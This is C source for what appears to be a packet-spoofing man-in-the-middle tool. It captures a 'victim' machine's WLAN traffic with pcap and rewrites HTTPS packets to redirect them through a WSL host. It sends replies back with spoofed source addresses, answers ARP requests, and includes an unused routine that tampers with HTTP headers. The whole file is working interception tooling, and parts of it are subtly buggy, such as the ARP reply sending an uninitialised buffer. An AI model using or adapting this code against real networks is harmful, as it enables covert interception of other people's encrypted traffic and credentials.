#include "channelling.h"
#include "packet.h"
#include "globals.h"

void forward_loop_handler(u_char *argument, const struct pcap_pkthdr *packet_header, const unsigned char *packet_content);
void backward_loop_handler(u_char *argument, const struct pcap_pkthdr *packet_header, const unsigned char *packet_content);

void create_forward_channel(SpoofSession *session)
{
    char errbuf[PCAP_BUF_SIZE];
    session->forwardChannel.vEtherDevice = pcap_open(VETHER_DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS | PCAP_OPENFLAG_MAX_RESPONSIVENESS, 0, NULL, errbuf);
    if (session->forwardChannel.vEtherDevice == NULL)
    {
        LOG("Failed:%s\n", errbuf)
        exit(1);
    }

    char filter[100];
    uint8_t *mac_addr = session->machineInfo.MacAddress;
    memset(filter, 0, sizeof filter);
    sprintf(filter, "ether src %.2x:%.2x:%.2x:%.2x:%.2x:%.2x", mac_addr[0], mac_addr[1], mac_addr[2], mac_addr[3], mac_addr[4], mac_addr[5]);
    struct bpf_program fcode;
    session->forwardChannel.wlanDevice = pcap_open(WLAN_DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS | PCAP_OPENFLAG_NOCAPTURE_LOCAL | PCAP_OPENFLAG_MAX_RESPONSIVENESS, 0, NULL, errbuf);
    if (session->forwardChannel.wlanDevice == NULL)
    {
        LOG("Failed:%s\n", errbuf)
        exit(1);
    }
    if (pcap_compile(session->forwardChannel.wlanDevice, &fcode, filter, 1, wlanMask) >= 0)
    {
        int res = pcap_setfilter(session->forwardChannel.wlanDevice, &fcode);
        if (res < 0)
        {
            printf("Setting filter for wlan device failed!");
        }
    }
}
void create_backward_channel(SpoofSession *session)
{
    // Here we create different channels for different threads.
    // However, according to UserBridge example, one pcap_t can be safely accessed from two threads
    // This require more investigation.
    /*char errbuf[PCAP_BUF_SIZE];
    session->backwardChannel.vEtherDevice = pcap_open(VETHER_DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
    if (session->backwardChannel.vEtherDevice == NULL)
    {
        LOG("Failed:%s\n", errbuf)
        exit(1);
    }

    session->backwardChannel.wlanDevice = pcap_open(WLAN_DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
    if (session->backwardChannel.wlanDevice == NULL)
    {
        LOG("Failed:%s\n", errbuf)
        exit(1);
    }*/
    session->backwardChannel.vEtherDevice = session->forwardChannel.vEtherDevice;
    session->backwardChannel.wlanDevice = session->forwardChannel.wlanDevice;
}

void handleHttp(pcap_t *device, TcpPacket *tcpPacket, uint16_t len)
{
    if (!len)
        return;
    uint8_t *payload = tcpPacket->payload;
    char *pos = NULL;
    if (pos = strstr(payload, "Upgrade-Insecure-Requests"))
    {
        uint8_t *lineEnd = (uint8_t *)strstr(pos, "\r\n"); // It should always be
        if (*(lineEnd - 1) == '1')                         // found
        {
            TcpPacket *newPacket = malloc(sizeof(TcpPacket) + len);
            memcpy(newPacket, tcpPacket, sizeof(TcpPacket));
            memcpy(newPacket->payload, payload, len);
            memcpy(newPacket->ether.ether_dhost, gateMacAddr, 6);
            *(newPacket->payload + (lineEnd - payload) - 1) = '0';
            newPacket->tcp.checksum = TcpChecksum(newPacket);
            pcap_sendpacket(device, (const uint8_t *)newPacket, sizeof(TcpPacket) + len);
            free(newPacket);
        }
    }
    else
    {
        pcap_sendpacket(device, (const uint8_t *)tcpPacket, sizeof(TcpPacket) + len);
    }
    return;
}

void forward_loop_handler(u_char *argument, const struct pcap_pkthdr *packet_header, const unsigned char *packet_content)
{
    SpoofSession *session = (SpoofSession *)argument;
    if (session->exitFlag)
    {
        pcap_breakloop(session->forwardChannel.wlanDevice);
        return;
    }
    pcap_t *vEtherDevice = session->forwardChannel.vEtherDevice;
    pcap_t *wlanDevice = session->forwardChannel.wlanDevice;

    // u_char *dumpDevice = argument;
    const EthernetPacket *ethPacket = NULL;
    ethPacket = (EthernetPacket *)packet_content;
    if (!memcmp(ethPacket->header.ether_shost, localMacAddr, MACADDR_LEN)) // Packet sent by us
    {
        // ignore it
        return;
    }
    if (memcmp(ethPacket->header.ether_shost, session->machineInfo.MacAddress, MACADDR_LEN))
    // Packet not sent by victim
    {
        // ignore it
        return;
    }

    uint32_t ipv4 = ntohs(0x0800);
    if (ethPacket->header.ether_type == ipv4) // IPv4
    {
        Ipv4Packet *ipv4Packet = (Ipv4Packet *)ethPacket;
        if (ipv4Packet->ipv4.proto == 6) // TCP
        {
            TcpPacket *tcpPacket = (TcpPacket *)ethPacket;
            uint16_t sourcePort = ntohs(tcpPacket->tcp.src_port);
            uint16_t destPort = ntohs(tcpPacket->tcp.dst_port);
            if (sourcePort == 80 || destPort == 80) // HTTP
            {
                // pcap_dump(dumpDevice, packet_header, packet_content);
                uint16_t len = ntohs(ipv4Packet->ipv4.len) - sizeof(ipv4Packet->ipv4) - (tcpPacket->tcp.data_off_set >> 4 << 2);
                // uint16_t checksum = TcpChecksum(tcpPacket);
                // uint16_t ipchecksum = Ipv4Checksum(ipv4Packet);
                // handleHttp(tcpPacket, len);
                return;
            }
            if (destPort == 443) // HTTPS
            {
                // pcap_dump(dumpDevice, packet_header, packet_content);
                uint8_t *pkt = malloc(packet_header->len);
                memcpy(pkt, packet_content, packet_header->len);
                TcpPacket *modified = (TcpPacket *)pkt;
                memcpy(modified->ether.ether_shost, wslHostAddr, MACADDR_LEN);
                memcpy(modified->ether.ether_dhost, wslAddr, MACADDR_LEN);
                modified->ipv4.dst = ipWsl;
                modified->ipv4.checksum = Ipv4Checksum((Ipv4Packet *)modified);
                modified->tcp.checksum = TcpChecksum(modified);
                int res = pcap_sendpacket(vEtherDevice, pkt, packet_header->len);
                free(pkt);
                char tcp_syn = 1 << 1;
                if (tcpPacket->tcp.flags & tcp_syn) // synchronize,tcp handshake
                {
                    // record target ip address
                    if (session->connections[sourcePort].state != 0) // tcp retransmit?
                    {
                        struct in_addr addr;
                        addr.s_addr = session->connections[sourcePort].destIp;
                        LOG("[WARN] port %d already have an active connection to %s, is tcp retransmitting?",
                            sourcePort, inet_ntoa(addr))
                        //  lock because this is abnormal behavior, we can't assume there is no port reusing here.
                        //  AcquireSRWLockExclusive(&session->rwLock);
                        session->connections[sourcePort].destIp = tcpPacket->ipv4.dst;
                        session->connections[sourcePort].state = 2;
                        session->connections[sourcePort].halfCloseSeq = 0;
                        // ReleaseSRWLockExclusive(&session->rwLock);
                    }
                    else
                    {
                        session->connections[sourcePort].destIp = tcpPacket->ipv4.dst;
                        session->connections[sourcePort].state = 2;
                        session->connections[sourcePort].halfCloseSeq = 0;
                    }
                }
            }
        }
    }
    else
    {
        uint8_t *pkt = malloc(packet_header->len);
        memcpy(pkt, packet_content, packet_header->len);
        pcap_sendpacket(wlanDevice, pkt, packet_header->len);
        free(pkt);
    }
}
void backward_loop_handler(u_char *argument, const struct pcap_pkthdr *packet_header, const unsigned char *packet_content)
{
    SpoofSession *session = (SpoofSession *)argument;
    if (session->exitFlag)
    {
        pcap_breakloop(session->backwardChannel.vEtherDevice);
        return;
    }
    const EthernetPacket *ethPacket = NULL;
    ethPacket = (EthernetPacket *)packet_content;

    uint32_t ipv4 = ntohs(0x0800);
    uint32_t arp = ntohs(0x0806); // we answer arp here as there are no other machines
    if (ethPacket->header.ether_type == arp)
    {
        ArpPacket *arpPacket = (ArpPacket *)ethPacket;
        if (arpPacket->arp.ar_op == 1 && memcmp(ethPacket->header.ether_shost, wslAddr, MACADDR_LEN) == 0) // arp sent by wsl
        {
            if (arpPacket->arp.ar_tip == session->machineInfo.IpAddress)
            {
                ArpPacket newPacket;
                SetupArpPacket(arpPacket, wslHostAddr, wslAddr, session->machineInfo.IpAddress, ipWsl, 2);
                pcap_sendpacket(session->backwardChannel.vEtherDevice, (u_char *)&newPacket, sizeof(ArpPacket));
            }
        }
    }
    else if (ethPacket->header.ether_type == ipv4) // IPv4
    {
        Ipv4Packet *ipv4Packet = (Ipv4Packet *)ethPacket;
        if (ipv4Packet->ipv4.proto == 6) // TCP
        {
            TcpPacket *tcpPacket = (TcpPacket *)ethPacket;
            uint16_t sourcePort = ntohs(tcpPacket->tcp.src_port);
            uint16_t destPort = ntohs(tcpPacket->tcp.dst_port);
            if (sourcePort == 443 || destPort == 443) // HTTPS
            {
                char tcp_fin = 1;
                char tcp_rst = 1 << 2;
                // verify valid
                if (tcpPacket->tcp.checksum != TcpChecksum(tcpPacket)) // bad checksum
                {
                    return;
                }
                // pcap_dump(dumpDevice, packet_header, packet_content);
                if (ipv4Packet->ipv4.dst == session->machineInfo.IpAddress)
                {
                    // packet sent by wsl to victim
                    // retransmit it
                    uint8_t *pkt = malloc(packet_header->len);
                    memcpy(pkt, packet_content, packet_header->len);
                    TcpPacket *modified = (TcpPacket *)pkt;
                    memcpy(modified->ether.ether_shost, localMacAddr, MACADDR_LEN);
                    memcpy(modified->ether.ether_dhost, session->machineInfo.MacAddress, MACADDR_LEN);
                    // AcquireSRWLockShared(&session->rwLock);
                    modified->ipv4.src = session->connections[destPort].destIp == 0 ? ipAddr : session->connections[destPort].destIp;
                    // ReleaseSRWLockShared(&session->rwLock);
                    modified->ipv4.checksum = Ipv4Checksum((Ipv4Packet *)modified);
                    modified->tcp.checksum = TcpChecksum(modified);
                    int res = pcap_sendpacket(session->backwardChannel.wlanDevice, pkt, packet_header->len);
                    free(pkt);

                    if (tcpPacket->tcp.flags & tcp_rst)
                    {
                        // AcquireSRWLockExclusive(&session->rwLock);
                        session->connections[destPort].state = 0;
                        session->connections[destPort].halfCloseSeq = 0;
                        session->connections[destPort].destIp = 0; // close connection
                        // ReleaseSRWLockExclusive(&session->rwLock);
                    }
                    else if (tcpPacket->tcp.flags & tcp_fin)
                    {
                        // AcquireSRWLockExclusive(&session->rwLock);
                        //  normally two thread wont modify the same connection object at the same time
                        if (session->connections[destPort].state == 2) // connected
                        {
                            // go to half-closed
                            session->connections[destPort].state = 1;
                            session->connections[destPort].halfCloseSeq = tcpPacket->tcp.seq;
                        }
                        else if (session->connections[destPort].state == 1)
                        {
                            if (tcpPacket->tcp.ack_seq == session->connections[destPort].halfCloseSeq + 1)
                            {
                                session->connections[sourcePort].state = 0;
                                session->connections[sourcePort].halfCloseSeq = 0;
                                session->connections[sourcePort].destIp = 0; // close connection
                            }
                        }
                        // ReleaseSRWLockExclusive(&session->rwLock);
                    }
                }
                else if (ipv4Packet->ipv4.src == session->machineInfo.IpAddress)
                {
                    // actually this is a retransmitted packet,
                    // we put it here to avoid data racing
                    // as the cost of creating a read-write lock for every port is too high
                    if (tcpPacket->tcp.flags & tcp_rst)
                    {
                        // AcquireSRWLockExclusive(&session->rwLock);
                        session->connections[sourcePort].state = 0;
                        session->connections[sourcePort].halfCloseSeq = 0;
                        session->connections[sourcePort].destIp = 0; // close connection
                        // ReleaseSRWLockExclusive(&session->rwLock);
                    }
                    else if (tcpPacket->tcp.flags & tcp_fin)
                    {
                        // AcquireSRWLockExclusive(&session->rwLock);
                        //  normally two thread wont modify the same connection object at the same time
                        if (session->connections[sourcePort].state == 2) // connected
                        {
                            // go to half-closed
                            session->connections[sourcePort].state--;
                            session->connections[sourcePort].halfCloseSeq = tcpPacket->tcp.seq;
                        }
                        else if (session->connections[sourcePort].state == 1)
                        {
                            if (tcpPacket->tcp.ack_seq == session->connections[sourcePort].halfCloseSeq + 1)
                            {
                                session->connections[sourcePort].state = 0;
                                session->connections[sourcePort].halfCloseSeq = 0;
                                session->connections[sourcePort].destIp = 0; // close connection
                            }
                        }
                        // ReleaseSRWLockExclusive(&session->rwLock);
                    }
                }
            }
        }
    }
}

unsigned long forward_thread_proc(void *arg)
{
    SpoofSession *session = arg;
    int res = 0;
    struct pcap_pkthdr *hdr;
    const u_char *pktdata;
    if (pcap_loop(session->forwardChannel.wlanDevice, -1, forward_loop_handler, (u_char *)session))
    {
        LOG("Failed: to open forward loop\n")
        exit(1);
    }
    /*while (res = pcap_next_ex(session->forwardChannel.wlanDevice, &hdr, &pktdata) >= 0 && !session->exitFlag)
    {
        forward_loop_handler(session, hdr, pktdata);
    }*/
}
void run_forward_loop(SpoofSession *session)
{

    DWORD threadId;
    session->hForwardThread = CreateThread(NULL, 0, forward_thread_proc, session, 0, &threadId);
    if (!session->hForwardThread)
    {
        LOG("Error:Create forward thread failed!");
        exit(1);
    }
}
unsigned long backward_thread_proc(void *arg)
{
    SpoofSession *session = arg;
    int res = 0;
    struct pcap_pkthdr *hdr;
    const u_char *pktdata;
    if (pcap_loop(session->backwardChannel.vEtherDevice, -1, backward_loop_handler, (u_char *)session))
    {
        LOG("Failed: to open backward loop\n")
        exit(1);
    }
    /*while (res = pcap_next_ex(session->backwardChannel.vEtherDevice, &hdr, &pktdata) >= 0 && !session->exitFlag)
    {
        backward_loop_handler(session, hdr, pktdata);
    }*/
}
void run_backward_loop(SpoofSession *session)
{
    DWORD threadId;
    session->hBackwardThread = CreateThread(NULL, 0, backward_thread_proc, session, 0, &threadId);
    if (!session->hBackwardThread)
    {
        LOG("Error:Create backward thread failed!");
        exit(1);
    }
}